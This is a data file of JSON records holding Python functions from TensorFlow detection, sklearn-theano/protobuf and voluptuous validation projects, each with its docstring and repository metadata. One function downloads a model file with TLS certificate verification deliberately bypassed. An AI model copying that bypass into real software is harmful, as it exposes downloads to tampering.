{"docstring": "'''\nBuild an 1x1 conv layer.\nThe layer consists of 1x1 convolutions implemented as\nmatrix multiplication. This makes the layer very fast.\nThe layer has \"hyp['num_inner_channel']\" channels\n'''\n\n", "func_signal": "def _build_output_layer(hyp, hidden_output):\n", "code": "grid_size = hyp['grid_width'] * hyp['grid_height']\nouter_size = grid_size * hyp['batch_size']\n\nbox_weights = tf.get_variable('box_out',\n                              shape=(hyp['num_inner_channel'], 4))\nconf_weights = tf.get_variable('confs_out',\n                               shape=(hyp['num_inner_channel'],\n                                      hyp['num_classes']))\n\npred_boxes = tf.reshape(tf.matmul(hidden_output, box_weights) * 50,\n                        [outer_size, 1, 4])\n\n# hyp['rnn_len']\npred_logits = tf.reshape(tf.matmul(hidden_output, conf_weights),\n                         [outer_size, 1, hyp['num_classes']])\n\npred_logits_squash = tf.reshape(pred_logits,\n                                [outer_size,\n                                 hyp['num_classes']])\n\npred_confidences_squash = tf.nn.softmax(pred_logits_squash)\npred_confidences = tf.reshape(pred_confidences_squash,\n                              [outer_size, hyp['rnn_len'],\n                               hyp['num_classes']])\nreturn pred_boxes, pred_logits, pred_confidences", "path": "decoder\\fastBox.py", "repo_name": "MarvinTeichmann/KittiBox", "stars": 403, "license": "mit", "language": "python", "size": 21347}
{"docstring": "#print \"Parsing: \", filename\n", "func_signal": "def parse(filename, abs_path=False):\n", "code": "name, ext = os.path.splitext(filename)\n\nif (ext == \".gz\" or ext == \".bz2\"):\n        name, ext = os.path.splitext(name)\n\nif(ext == \".idl\"):\n        annolist = parseIDL(filename)\nelif(ext == \".al\"):\n        annolist = parseXML(filename)\nelif(ext == \".pal\"):\n        annolist = PalLib.pal2al(PalLib.loadPal(filename));\nelse:\n        annolist = AnnoList([]);\n\nif abs_path:\n        basedir = os.path.dirname(os.path.abspath(filename))\n        for a in annolist:\n                a.imageName = basedir + \"/\" + os.path.basename(a.imageName)\n\nreturn annolist", "path": "submodules\\utils\\annolist\\AnnotationLib.py", "repo_name": "MarvinTeichmann/KittiBox", "stars": 403, "license": "mit", "language": "python", "size": 21347}
{"docstring": "\"\"\"\nCompute summary metrics for tensorboard\n\"\"\"\n\n", "func_signal": "def evaluation(hyp, images, labels, decoded_logits, losses, global_step):\n", "code": "pred_confidences = decoded_logits['pred_confidences']\npred_boxes = decoded_logits['pred_boxes']\n# Estimating Accuracy\ngrid_size = hyp['grid_width'] * hyp['grid_height']\nconfidences, boxes, mask = labels\n\nnew_shape = [hyp['batch_size'], hyp['grid_height'],\n             hyp['grid_width'], hyp['num_classes']]\npred_confidences_r = tf.reshape(pred_confidences, new_shape)\n# Set up summary operations for tensorboard\na = tf.equal(tf.cast(confidences, 'int64'),\n             tf.argmax(pred_confidences_r, 3))\n\naccuracy = tf.reduce_mean(tf.cast(a, 'float32'), name='/accuracy')\n\neval_list = []\neval_list.append(('Acc.', accuracy))\neval_list.append(('Conf', losses['confidences_loss']))\neval_list.append(('Box', losses['boxes_loss']))\neval_list.append(('Weight', losses['weight_loss']))\nif hyp['use_rezoom']:\n    eval_list.append(('Delta', losses['delta_boxes_loss'] +\n                      losses['delta_confs_loss']))\n\n# Log Images\n# show ground truth to verify labels are correct\npred_confidences_r = tf.reshape(\n    pred_confidences,\n    [hyp['batch_size'], grid_size, hyp['rnn_len'], hyp['num_classes']])\n\n# show predictions to visualize training progress\npred_boxes_r = tf.reshape(\n    pred_boxes, [hyp['batch_size'], grid_size, hyp['rnn_len'],\n                 4])\ntest_pred_confidences = pred_confidences_r[0, :, :, :]\ntest_pred_boxes = pred_boxes_r[0, :, :, :]\n\ndef log_image(np_img, np_confidences, np_boxes, np_global_step,\n              pred_or_true):\n\n    if pred_or_true == 'pred':\n        plot_image = train_utils.add_rectangles(\n            hyp, np_img, np_confidences, np_boxes, use_stitching=True,\n            rnn_len=hyp['rnn_len'])[0]\n    else:\n        np_mask = np_boxes\n        plot_image = data_utils.draw_encoded(\n            np_img[0], np_confidences[0], mask=np_mask[0], cell_size=32)\n\n    num_images = 10\n\n    filename = '%s_%s.jpg' % \\\n        ((np_global_step // hyp['logging']['write_iter'])\n            % num_images, pred_or_true)\n    img_path = os.path.join(hyp['dirs']['output_dir'], filename)\n\n    scp.misc.imsave(img_path, plot_image)\n    return plot_image\n\npred_log_img = tf.py_func(log_image,\n                          [images, test_pred_confidences,\n                           test_pred_boxes, global_step, 'pred'],\n                          [tf.float32])\n\ntrue_log_img = tf.py_func(log_image,\n                          [images, confidences,\n                           mask, global_step, 'true'],\n                          [tf.uint8])\ntf.summary.image('/pred_boxes', tf.stack(pred_log_img))\ntf.summary.image('/true_boxes', tf.stack(true_log_img))\nreturn eval_list", "path": "decoder\\fastBox.py", "repo_name": "MarvinTeichmann/KittiBox", "stars": 403, "license": "mit", "language": "python", "size": 21347}
{"docstring": "\"\"\" Reads a kitti annotation file.\n\nArgs:\nlabel_file: Path to file\n\nReturns:\n  Lists of rectangels: Cars and don't care area.\n\"\"\"\n", "func_signal": "def read_kitti_anno(label_file, detect_truck):\n", "code": "labels = [line.rstrip().split(' ') for line in open(label_file)]\nrect_list = []\nfor label in labels:\n    if not (label[0] == 'Car' or label[0] == 'Van' or\n            label[0] == 'Truck' or label[0] == 'DontCare'):\n        continue\n    notruck = not detect_truck\n    if notruck and label[0] == 'Truck':\n        continue\n    if label[0] == 'DontCare':\n        class_id = -1\n    else:\n        class_id = 1\n    object_rect = AnnoLib.AnnoRect(\n        x1=float(label[4]), y1=float(label[5]),\n        x2=float(label[6]), y2=float(label[7]))\n    assert object_rect.x1 < object_rect.x2\n    assert object_rect.y1 < object_rect.y2\n    object_rect.classID = class_id\n    rect_list.append(object_rect)\n\nreturn rect_list", "path": "inputs\\kitti_input.py", "repo_name": "MarvinTeichmann/KittiBox", "stars": 403, "license": "mit", "language": "python", "size": 21347}
{"docstring": "# Automatically set a name if not provided.\n", "func_signal": "def layer_decorated(self, *args, **kwargs):\n", "code": "name = kwargs.setdefault('name', self.get_unique_name(op.__name__))\n# Figure out the layer inputs.\nif len(self.inputs)==0:\n    raise RuntimeError('No input variables found for layer %s.'%name)\nelif len(self.inputs)==1:\n    layer_input = self.inputs[0]\nelse:\n    layer_input = list(self.inputs)\n# Perform the operation and get the output.\nlayer_output = op(self, layer_input, *args, **kwargs)\n# Add to layer LUT.\nself.layers[name] = layer_output\n# This output is now the input for the next layer.\nself.feed(layer_output)\n# Return self for chained calls.\nreturn self", "path": "submodules\\utils\\kaffe\\network.py", "repo_name": "MarvinTeichmann/KittiBox", "stars": 403, "license": "mit", "language": "python", "size": 21347}
{"docstring": "\"\"\"Start enqueuing threads.\"\"\"\n\n# Creating Placeholder for the Queue\n", "func_signal": "def start_enqueuing_threads(hypes, q, phase, sess):\n", "code": "x_in = tf.placeholder(tf.float32)\nconfs_in = tf.placeholder(tf.float32)\nboxes_in = tf.placeholder(tf.float32)\nmask_in = tf.placeholder(tf.float32)\n\n# Creating Enqueue OP\nenqueue_op = q.enqueue((x_in, confs_in, boxes_in, mask_in))\n\ndef make_feed(data):\n    return {x_in: data['image'],\n            confs_in: data['confs'],\n            boxes_in: data['boxes'],\n            mask_in: data['mask']}\n\ndef thread_loop(sess, enqueue_op, gen):\n    for d in gen:\n        sess.run(enqueue_op, feed_dict=make_feed(d))\n\ndata_file = hypes[\"data\"]['%s_file' % phase]\ndata_dir = hypes['dirs']['data_dir']\ndata_file = os.path.join(data_dir, data_file)\n\ngen = _load_kitti_txt(data_file, hypes,\n                      jitter={'train': hypes['solver']['use_jitter'],\n                              'val': False}[phase])\n\ndata = gen.next()\nsess.run(enqueue_op, feed_dict=make_feed(data))\nt = threading.Thread(target=thread_loop,\n                     args=(sess, enqueue_op, gen))\nt.daemon = True\nt.start()", "path": "inputs\\kitti_input.py", "repo_name": "MarvinTeichmann/KittiBox", "stars": 403, "license": "mit", "language": "python", "size": 21347}
{"docstring": "# Because these operations are not commutative, consider randomizing\n# randomize the order their operation.\n", "func_signal": "def _processe_image(hypes, image):\n", "code": "augment_level = hypes['augment_level']\nif augment_level > 0:\n    image = tf.image.random_brightness(image, max_delta=30)\n    image = tf.image.random_contrast(image, lower=0.75, upper=1.25)\nif augment_level > 1:\n    image = tf.image.random_saturation(image, lower=0.5, upper=1.6)\n    image = tf.image.random_hue(image, max_delta=0.15)\n\nimage = tf.minimum(image, 255.0)\nimage = tf.maximum(image, 0)\n\nreturn image", "path": "inputs\\kitti_input.py", "repo_name": "MarvinTeichmann/KittiBox", "stars": 403, "license": "mit", "language": "python", "size": 21347}
{"docstring": "\"\"\"Support the pickle protocol.\"\"\"\n", "func_signal": "def __setstate__(self, state):\n", "code": "self.__init__()\nself.ParseFromString(state['serialized'])", "path": "sklearn_theano\\externals\\google\\protobuf\\message.py", "repo_name": "sklearn-theano/sklearn-theano", "stars": 364, "license": "bsd-3-clause", "language": "python", "size": 15841}
{"docstring": "\"\"\"Return number of samples in array-like x.\"\"\"\n", "func_signal": "def _num_samples(x):\n", "code": "if not hasattr(x, '__len__') and not hasattr(x, 'shape'):\n    if hasattr(x, '__array__'):\n        x = np.asarray(x)\n    else:\n        raise TypeError(\"Expected sequence or array-like, got %r\" % x)\nreturn x.shape[0] if hasattr(x, 'shape') else len(x)", "path": "sklearn_theano\\utils\\ports.py", "repo_name": "sklearn-theano/sklearn-theano", "stars": 364, "license": "bsd-3-clause", "language": "python", "size": 15841}
{"docstring": "\"\"\"Check that all arrays have consistent first dimensions.\n\nChecks whether all objects in arrays have the same shape or length.\n\nParameters\n----------\narrays : list or tuple of input objects.\n    Objects that will be checked for consistent length.\n\"\"\"\n\n", "func_signal": "def check_consistent_length(*arrays):\n", "code": "uniques = np.unique([_num_samples(X) for X in arrays if X is not None])\nif len(uniques) > 1:\n    raise ValueError(\"Found arrays with inconsistent numbers of samples: %s\"\n                     % str(uniques))", "path": "sklearn_theano\\utils\\ports.py", "repo_name": "sklearn-theano/sklearn-theano", "stars": 364, "license": "bsd-3-clause", "language": "python", "size": 15841}
{"docstring": "\"\"\"Test that we can create a proto class.\"\"\"\n", "func_signal": "def testMakeSimpleProtoClass(self):\n", "code": "proto_cls = proto_builder.MakeSimpleProtoClass(\n    self._fields,\n    full_name='net.proto2.python.public.proto_builder_test.Test')\nproto = proto_cls()\nproto.foo = 12345\nproto.bar = 'asdf'\nself.assertMultiLineEqual(\n    'bar: \"asdf\"\\nfoo: 12345\\n', text_format.MessageToString(proto))", "path": "sklearn_theano\\externals\\google\\protobuf\\internal\\proto_builder_test.py", "repo_name": "sklearn-theano/sklearn-theano", "stars": 364, "license": "bsd-3-clause", "language": "python", "size": 15841}
{"docstring": "\"\"\"Adds the FileDescriptorProto and its types to this database.\n\nArgs:\n  file_desc_proto: The FileDescriptorProto to add.\nRaises:\n  DescriptorDatabaseException: if an attempt is made to add a proto\n    with the same name but different definition than an exisiting\n    proto in the database.\n\"\"\"\n", "func_signal": "def Add(self, file_desc_proto):\n", "code": "proto_name = file_desc_proto.name\nif proto_name not in self._file_desc_protos_by_file:\n  self._file_desc_protos_by_file[proto_name] = file_desc_proto\nelif self._file_desc_protos_by_file[proto_name] != file_desc_proto:\n  raise DescriptorDatabaseConflictingDefinitionError(\n      '%s already added, but with different descriptor.' % proto_name)\n\npackage = file_desc_proto.package\nfor message in file_desc_proto.message_type:\n  self._file_desc_protos_by_symbol.update(\n      (name, file_desc_proto) for name in _ExtractSymbols(message, package))\nfor enum in file_desc_proto.enum_type:\n  self._file_desc_protos_by_symbol[\n      '.'.join((package, enum.name))] = file_desc_proto", "path": "sklearn_theano\\externals\\google\\protobuf\\descriptor_database.py", "repo_name": "sklearn-theano/sklearn-theano", "stars": 364, "license": "bsd-3-clause", "language": "python", "size": 15841}
{"docstring": "\"\"\"Pulls out all the symbols from a descriptor proto.\n\nArgs:\n  desc_proto: The proto to extract symbols from.\n  package: The package containing the descriptor type.\n\nYields:\n  The fully qualified name found in the descriptor.\n\"\"\"\n\n", "func_signal": "def _ExtractSymbols(desc_proto, package):\n", "code": "message_name = '.'.join((package, desc_proto.name))\nyield message_name\nfor nested_type in desc_proto.nested_type:\n  for symbol in _ExtractSymbols(nested_type, message_name):\n    yield symbol\nfor enum_type in desc_proto.enum_type:\n  yield '.'.join((message_name, enum_type.name))", "path": "sklearn_theano\\externals\\google\\protobuf\\descriptor_database.py", "repo_name": "sklearn-theano/sklearn-theano", "stars": 364, "license": "bsd-3-clause", "language": "python", "size": 15841}
{"docstring": "\"\"\"Parse serialized protocol buffer data into this message.\n\nLike MergeFromString(), except we clear the object first and\ndo not return the value that MergeFromString returns.\n\"\"\"\n", "func_signal": "def ParseFromString(self, serialized):\n", "code": "self.Clear()\nself.MergeFromString(serialized)", "path": "sklearn_theano\\externals\\google\\protobuf\\message.py", "repo_name": "sklearn-theano/sklearn-theano", "stars": 364, "license": "bsd-3-clause", "language": "python", "size": 15841}
{"docstring": "\"\"\"Test that the field order is maintained when given an OrderedDict.\"\"\"\n", "func_signal": "def testOrderedFields(self):\n", "code": "proto_cls = proto_builder.MakeSimpleProtoClass(\n    self.ordered_fields,\n    full_name='net.proto2.python.public.proto_builder_test.OrderedTest')\nproto = proto_cls()\nproto.foo = 12345\nproto.bar = 'asdf'\nself.assertMultiLineEqual(\n    'foo: 12345\\nbar: \"asdf\"\\n', text_format.MessageToString(proto))", "path": "sklearn_theano\\externals\\google\\protobuf\\internal\\proto_builder_test.py", "repo_name": "sklearn-theano/sklearn-theano", "stars": 364, "license": "bsd-3-clause", "language": "python", "size": 15841}
{"docstring": "\"\"\"Checks for existence of caffemodel protobuffer.\nDownloads it if it cannot be found.\"\"\"\n\n", "func_signal": "def fetch_balanced_vgg_protobuffer_file(caffemodel_file=None):\n", "code": "default_filename = os.path.join(BALANCED_VGG_PATH,\n                                \"vgg_normalised.caffemodel\")\n\nif caffemodel_file is not None:\n    if os.path.exists(caffemodel_file):\n        return caffemodel_file\n    else:\n        if os.path.exists(default_filename):\n            import warnings\n            warnings.warn('Did not find %s, but found and returned %s.' %\n                          (caffemodel_file, default_filename))\n            return default_filename\nelse:\n    if os.path.exists(default_filename):\n        return default_filename\n\n# We didn't find the file, let's download it. To the specified location\n# if specified, otherwise to the default place\nif caffemodel_file is None:\n    caffemodel_file = default_filename\n    if not os.path.exists(BALANCED_VGG_PATH):\n        os.makedirs(BALANCED_VGG_PATH)\n\nurl = \"https://bethgelab.org/media/uploads/deeptextures/\"\nurl += \"vgg_normalised.caffemodel\"\n# Need to bypass cert for bethge lab download\ndownload(url, caffemodel_file, progress_update_percentage=1,\n         bypass_certificate_check=True)\nreturn caffemodel_file", "path": "sklearn_theano\\feature_extraction\\caffe\\balanced_vgg.py", "repo_name": "sklearn-theano/sklearn-theano", "stars": 364, "license": "bsd-3-clause", "language": "python", "size": 15841}
{"docstring": "# Verifies that a property like 'messageDescriptor.fields' has all the\n# properties of an immutable abc.Sequence.\n", "func_signal": "def CheckDescriptorSequence(self, sequence):\n", "code": "self.assertGreater(len(sequence), 0)  # Sized\nself.assertEqual(len(sequence), len(list(sequence)))  # Iterable\nitem = sequence[0]\nself.assertEqual(item, sequence[0])\nself.assertIn(item, sequence)  # Container\nself.assertEqual(sequence.index(item), 0)\nself.assertEqual(sequence.count(item), 1)\nreversed_iterator = reversed(sequence)\nself.assertEqual(list(reversed_iterator), list(sequence)[::-1])\nself.assertRaises(StopIteration, next, reversed_iterator)", "path": "sklearn_theano\\externals\\google\\protobuf\\internal\\descriptor_test.py", "repo_name": "sklearn-theano/sklearn-theano", "stars": 364, "license": "bsd-3-clause", "language": "python", "size": 15841}
{"docstring": "\"\"\"Split arrays or matrices into random train and test subsets\n\nQuick utility that wraps input validation and\n``next(iter(ShuffleSplit(n_samples)))`` and application to input\ndata into a single call for splitting (and optionally subsampling)\ndata in a oneliner.\n\nParameters\n----------\n*arrays : sequence of arrays or scipy.sparse matrices with same shape[0]\n    Python lists or tuples occurring in arrays are converted to 1D numpy\n    arrays.\n\ntest_size : float, int, or None (default is None)\n    If float, should be between 0.0 and 1.0 and represent the\n    proportion of the dataset to include in the test split. If\n    int, represents the absolute number of test samples. If None,\n    the value is automatically set to the complement of the train size.\n    If train size is also None, test size is set to 0.25.\n\ntrain_size : float, int, or None (default is None)\n    If float, should be between 0.0 and 1.0 and represent the\n    proportion of the dataset to include in the train split. If\n    int, represents the absolute number of train samples. If None,\n    the value is automatically set to the complement of the test size.\n\nrandom_state : int or RandomState\n    Pseudo-random number generator state used for random sampling.\n\nReturns\n-------\nsplitting : list of arrays, length=2 * len(arrays)\n    List containing train-test split of input array.\n\nExamples\n--------\n>>> import numpy as np\n>>> from sklearn.cross_validation import train_test_split\n>>> a, b = np.arange(10).reshape((5, 2)), range(5)\n>>> a\narray([[0, 1],\n       [2, 3],\n       [4, 5],\n       [6, 7],\n       [8, 9]])\n>>> list(b)\n[0, 1, 2, 3, 4]\n\n>>> a_train, a_test, b_train, b_test = train_test_split(\n...     a, b, test_size=0.33, random_state=42)\n...\n>>> a_train\narray([[4, 5],\n       [0, 1],\n       [6, 7]])\n>>> b_train\n[2, 0, 3]\n>>> a_test\narray([[2, 3],\n       [8, 9]])\n>>> b_test\n[1, 4]\n\n\"\"\"\n", "func_signal": "def train_test_split(*arrays, **options):\n", "code": "n_arrays = len(arrays)\nif n_arrays == 0:\n    raise ValueError(\"At least one array required as input\")\n\ntest_size = options.pop('test_size', None)\ntrain_size = options.pop('train_size', None)\nrandom_state = options.pop('random_state', None)\ndtype = options.pop('dtype', None)\nif dtype is not None:\n    warnings.warn(\"dtype option is ignored and will be removed in 0.18.\")\n\nforce_arrays = options.pop('force_arrays', False)\nif options:\n    raise TypeError(\"Invalid parameters passed: %s\" % str(options))\nif force_arrays:\n    warnings.warn(\"The force_arrays option is deprecated and will be \"\n                  \"removed in sklearn 0.18.\", DeprecationWarning)\n\nif test_size is None and train_size is None:\n    test_size = 0.25\narrays = indexable(*arrays)\nn_samples = _num_samples(arrays[0])\ncv = ShuffleSplit(n_samples, test_size=test_size,\n                  train_size=train_size,\n                  random_state=random_state)\n\ntrain, test = next(iter(cv))\nreturn list(chain.from_iterable((safe_indexing(a, train),\n                                 safe_indexing(a, test)) for a in arrays))", "path": "sklearn_theano\\utils\\ports.py", "repo_name": "sklearn-theano/sklearn-theano", "stars": 364, "license": "bsd-3-clause", "language": "python", "size": 15841}
{"docstring": "# Verifies that a property like 'messageDescriptor.fields' has all the\n# properties of an immutable abc.Mapping.\n", "func_signal": "def CheckDescriptorMapping(self, mapping):\n", "code": "self.assertGreater(len(mapping), 0)  # Sized\nself.assertEqual(len(mapping), len(list(mapping)))  # Iterable\nif sys.version_info >= (3,):\n  key, item = next(iter(list(mapping.items())))\nelse:\n  key, item = list(mapping.items())[0]\nself.assertIn(key, mapping)  # Container\nself.assertEqual(mapping.get(key), item)\n# keys(), iterkeys() &co\nitem = (next(iter(list(mapping.keys()))), next(iter(list(mapping.values()))))\nself.assertEqual(item, next(iter(list(mapping.items()))))\nif sys.version_info < (3,):\n  def CheckItems(seq, iterator):\n    self.assertEqual(next(iterator), seq[0])\n    self.assertEqual(list(iterator), seq[1:])\n  CheckItems(list(mapping.keys()), iter(mapping.keys()))\n  CheckItems(list(mapping.values()), iter(mapping.values()))\n  CheckItems(list(mapping.items()), iter(mapping.items()))", "path": "sklearn_theano\\externals\\google\\protobuf\\internal\\descriptor_test.py", "repo_name": "sklearn-theano/sklearn-theano", "stars": 364, "license": "bsd-3-clause", "language": "python", "size": 15841}
{"docstring": "\"\"\"Make arrays indexable for cross-validation.\n\nChecks consistent length, passes through None, and ensures that everything\ncan be indexed by converting sparse matrices to csr and converting\nnon-interable objects to arrays.\n\nParameters\n----------\niterables : lists, dataframes, arrays, sparse matrices\n    List of objects to ensure sliceability.\n\"\"\"\n", "func_signal": "def indexable(*iterables):\n", "code": "result = []\nfor X in iterables:\n    if sp.issparse(X):\n        result.append(X.tocsr())\n    elif hasattr(X, \"__getitem__\") or hasattr(X, \"iloc\"):\n        result.append(X)\n    elif X is None:\n        result.append(X)\n    else:\n        result.append(np.array(X))\ncheck_consistent_length(*result)\nreturn result", "path": "sklearn_theano\\utils\\ports.py", "repo_name": "sklearn-theano/sklearn-theano", "stars": 364, "license": "bsd-3-clause", "language": "python", "size": 15841}
{"docstring": "\"\"\"Test that the DescriptorPool is used.\"\"\"\n", "func_signal": "def testMakeSameProtoClassTwice(self):\n", "code": "pool = descriptor_pool.DescriptorPool()\nproto_cls1 = proto_builder.MakeSimpleProtoClass(\n    self._fields,\n    full_name='net.proto2.python.public.proto_builder_test.Test',\n    pool=pool)\nproto_cls2 = proto_builder.MakeSimpleProtoClass(\n    self._fields,\n    full_name='net.proto2.python.public.proto_builder_test.Test',\n    pool=pool)\nself.assertIs(proto_cls1.DESCRIPTOR, proto_cls2.DESCRIPTOR)", "path": "sklearn_theano\\externals\\google\\protobuf\\internal\\proto_builder_test.py", "repo_name": "sklearn-theano/sklearn-theano", "stars": 364, "license": "bsd-3-clause", "language": "python", "size": 15841}
{"docstring": "# Basic properties\n", "func_signal": "def CheckFieldDescriptor(self, field_descriptor):\n", "code": "self.assertEqual(field_descriptor.name, 'optional_int32')\nself.assertEqual(field_descriptor.full_name,\n                 'protobuf_unittest.TestAllTypes.optional_int32')\nself.assertEqual(field_descriptor.containing_type.name, 'TestAllTypes')\n# Test equality and hashability\nself.assertEqual(field_descriptor, field_descriptor)\nself.assertEqual(\n    field_descriptor.containing_type.fields_by_name['optional_int32'],\n    field_descriptor)\nself.assertIn(field_descriptor, [field_descriptor])\nself.assertIn(field_descriptor, {field_descriptor: None})", "path": "sklearn_theano\\externals\\google\\protobuf\\internal\\descriptor_test.py", "repo_name": "sklearn-theano/sklearn-theano", "stars": 364, "license": "bsd-3-clause", "language": "python", "size": 15841}
{"docstring": "\"\"\"Escape a bytes string for use in an ascii protocol buffer.\n\ntext.encode('string_escape') does not seem to satisfy our needs as it\nencodes unprintable characters using two-digit hex escapes whereas our\nC++ unescaping function allows hex escapes to be any length.  So,\n\"\\0011\".encode('string_escape') ends up being \"\\\\x011\", which will be\ndecoded in C++ as a single-character string with char code 0x11.\n\nArgs:\n  text: A byte string to be escaped\n  as_utf8: Specifies if result should be returned in UTF-8 encoding\nReturns:\n  Escaped string\n\"\"\"\n# PY3 hack: make Ord work for str and bytes:\n# //platforms/networking/data uses unicode here, hence basestring.\n", "func_signal": "def CEscape(text, as_utf8):\n", "code": "Ord = ord if isinstance(text, six.string_types) else lambda x: x\nif as_utf8:\n  return ''.join(_cescape_utf8_to_str[Ord(c)] for c in text)\nreturn ''.join(_cescape_byte_to_str[Ord(c)] for c in text)", "path": "sklearn_theano\\externals\\google\\protobuf\\text_encoding.py", "repo_name": "sklearn-theano/sklearn-theano", "stars": 364, "license": "bsd-3-clause", "language": "python", "size": 15841}
{"docstring": "# Check that the collection is still valid even if the parent disappeared.\n", "func_signal": "def testCppDescriptorContainer(self):\n", "code": "enum = unittest_pb2.TestAllTypes.DESCRIPTOR.enum_types_by_name['NestedEnum']\nvalues = enum.values\ndel enum\nself.assertEqual('FOO', values[0].name)", "path": "sklearn_theano\\externals\\google\\protobuf\\internal\\descriptor_test.py", "repo_name": "sklearn-theano/sklearn-theano", "stars": 364, "license": "bsd-3-clause", "language": "python", "size": 15841}
{"docstring": "\"\"\"Copies the content of the specified message into the current message.\n\nThe method clears the current message and then merges the specified\nmessage using MergeFrom.\n\nArgs:\n  other_msg: Message to copy into the current one.\n\"\"\"\n", "func_signal": "def CopyFrom(self, other_msg):\n", "code": "if self is other_msg:\n  return\nself.Clear()\nself.MergeFrom(other_msg)", "path": "sklearn_theano\\externals\\google\\protobuf\\message.py", "repo_name": "sklearn-theano/sklearn-theano", "stars": 364, "license": "bsd-3-clause", "language": "python", "size": 15841}
{"docstring": "# Basic properties\n", "func_signal": "def CheckMessageDescriptor(self, message_descriptor):\n", "code": "self.assertEqual(message_descriptor.name, 'TestAllTypes')\nself.assertEqual(message_descriptor.full_name,\n                 'protobuf_unittest.TestAllTypes')\n# Test equality and hashability\nself.assertEqual(message_descriptor, message_descriptor)\nself.assertEqual(message_descriptor.fields[0].containing_type,\n                 message_descriptor)\nself.assertIn(message_descriptor, [message_descriptor])\nself.assertIn(message_descriptor, {message_descriptor: None})\n# Test field containers\nself.CheckDescriptorSequence(message_descriptor.fields)\nself.CheckDescriptorMapping(message_descriptor.fields_by_name)\nself.CheckDescriptorMapping(message_descriptor.fields_by_number)", "path": "sklearn_theano\\externals\\google\\protobuf\\internal\\descriptor_test.py", "repo_name": "sklearn-theano/sklearn-theano", "stars": 364, "license": "bsd-3-clause", "language": "python", "size": 15841}
{"docstring": "# Same test with the iterator\n", "func_signal": "def testCppDescriptorContainer_Iterator(self):\n", "code": "enum = unittest_pb2.TestAllTypes.DESCRIPTOR.enum_types_by_name['NestedEnum']\nvalues_iter = iter(enum.values)\ndel enum\nself.assertEqual('FOO', next(values_iter).name)", "path": "sklearn_theano\\externals\\google\\protobuf\\internal\\descriptor_test.py", "repo_name": "sklearn-theano/sklearn-theano", "stars": 364, "license": "bsd-3-clause", "language": "python", "size": 15841}
{"docstring": "\"\"\"Sets a value to default_value if none provided.\n\n>>> s = Schema(DefaultTo(42))\n>>> s(None)\n42\n\"\"\"\n", "func_signal": "def DefaultTo(default_value, msg=None):\n", "code": "@wraps(DefaultTo)\ndef f(v):\n    if v is None:\n        v = default_value\n    return v\nreturn f", "path": "saboteur\\voluptuous.py", "repo_name": "tomakehurst/saboteur", "stars": 379, "license": "apache-2.0", "language": "python", "size": 660}
{"docstring": "\"\"\"The length of a value must be in a certain range.\"\"\"\n", "func_signal": "def Length(min=None, max=None, msg=None):\n", "code": "@wraps(Length)\ndef f(v):\n    if min is not None and len(v) < min:\n        raise Invalid(msg or 'length of value must be at least %s' % min)\n    if max is not None and len(v) > max:\n        raise Invalid(msg or 'length of value must be at most %s' % max)\n    return v\nreturn f", "path": "saboteur\\voluptuous.py", "repo_name": "tomakehurst/saboteur", "stars": 379, "license": "apache-2.0", "language": "python", "size": 660}
{"docstring": "\"\"\"Convert human-readable boolean values to a bool.\n\nAccepted values are 1, true, yes, on, enable, and their negatives.\nNon-string values are cast to bool.\n\n>>> validate = Schema(Boolean())\n>>> validate(True)\nTrue\n>>> with raises(MultipleInvalid, \"expected boolean\"):\n...   validate('moo')\n\"\"\"\n", "func_signal": "def Boolean(v):\n", "code": "if isinstance(v, basestring):\n    v = v.lower()\n    if v in ('1', 'true', 'yes', 'on', 'enable'):\n        return True\n    if v in ('0', 'false', 'no', 'off', 'disable'):\n        return False\n    raise ValueError\nreturn bool(v)", "path": "saboteur\\voluptuous.py", "repo_name": "tomakehurst/saboteur", "stars": 379, "license": "apache-2.0", "language": "python", "size": 660}
{"docstring": "\"\"\"Coerce a value to a type.\n\nIf the type constructor throws a ValueError or TypeError, the value\nwill be marked as Invalid.\n\n\nDefault behavior:\n\n    >>> validate = Schema(Coerce(int))\n    >>> with raises(MultipleInvalid, 'expected int'):\n    ...   validate(None)\n    >>> with raises(MultipleInvalid, 'expected int'):\n    ...   validate('foo')\n\nWith custom message:\n\n    >>> validate = Schema(Coerce(int, \"moo\"))\n    >>> with raises(MultipleInvalid, 'moo'):\n    ...   validate('foo')\n\"\"\"\n", "func_signal": "def Coerce(type, msg=None):\n", "code": "@wraps(Coerce)\ndef f(v):\n    try:\n        return type(v)\n    except (ValueError, TypeError):\n        raise Invalid(msg or ('expected %s' % type.__name__))\nreturn f", "path": "saboteur\\voluptuous.py", "repo_name": "tomakehurst/saboteur", "stars": 379, "license": "apache-2.0", "language": "python", "size": 660}
{"docstring": "\"\"\"Return iterator over object attributes. Respect objects with\ndefined __slots__.\n\n\"\"\"\n", "func_signal": "def _iterate_object(obj):\n", "code": "d = {}\ntry:\n    d = vars(obj)\nexcept TypeError:\n    # maybe we have named tuple here?\n    if hasattr(obj, '_asdict'):\n        d = obj._asdict()\nfor item in iteritems(d):\n    yield item\ntry:\n    slots = obj.__slots__\nexcept AttributeError:\n    pass\nelse:\n    for key in slots:\n        if key != '__dict__':\n            yield (key, getattr(obj, key))\nraise StopIteration()", "path": "saboteur\\voluptuous.py", "repo_name": "tomakehurst/saboteur", "stars": 379, "license": "apache-2.0", "language": "python", "size": 660}
{"docstring": "\"\"\"Report a user-friendly message if a schema fails to validate.\n\n>>> validate = Schema(\n...   Msg(['one', 'two', int],\n...       'should be one of \"one\", \"two\" or an integer'))\n>>> with raises(MultipleInvalid, 'should be one of \"one\", \"two\" or an integer'):\n...   validate(['three'])\n\nMessages are only applied to invalid direct descendants of the schema:\n\n>>> validate = Schema(Msg([['one', 'two', int]], 'not okay!'))\n>>> with raises(MultipleInvalid, 'invalid list value @ data[0][0]'):\n...   validate([['three']])\n\"\"\"\n", "func_signal": "def Msg(schema, msg):\n", "code": "schema = Schema(schema)\n\n@wraps(Msg)\ndef f(v):\n    try:\n        return schema(v)\n    except Invalid as e:\n        if len(e.path) > 1:\n            raise e\n        else:\n            raise Invalid(msg)\nreturn f", "path": "saboteur\\voluptuous.py", "repo_name": "tomakehurst/saboteur", "stars": 379, "license": "apache-2.0", "language": "python", "size": 660}
{"docstring": "\"\"\"Iterate over schema in a meaningful order.\"\"\"\n# We want Extra to match last, because it's a catch-all.\n\n# Without this, Extra might appear first in the iterator, and fail\n# to validate a key even though it's a Required that has its own\n# validation, generating a false positive.\n", "func_signal": "def _iterate_mapping_candidates(schema):\n", "code": "return sorted(iteritems(schema),\n              key=lambda v: v[0] == Extra)", "path": "saboteur\\voluptuous.py", "repo_name": "tomakehurst/saboteur", "stars": 379, "license": "apache-2.0", "language": "python", "size": 660}
